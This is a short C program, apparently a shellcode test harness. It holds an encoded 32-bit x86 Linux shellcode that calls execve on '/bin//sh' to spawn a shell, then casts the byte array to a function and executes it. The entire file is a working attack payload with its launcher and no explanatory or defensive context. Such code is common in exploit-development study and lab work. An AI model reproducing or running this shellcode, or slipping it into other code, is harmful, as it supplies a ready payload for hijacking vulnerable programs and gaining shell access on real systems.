#include <stdio.h>

unsigned char code[] = \

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main(void){

  void (*shellcode)() = (void(*)())code;

  

  printf("Executing shellcode\n");

  shellcode();

}
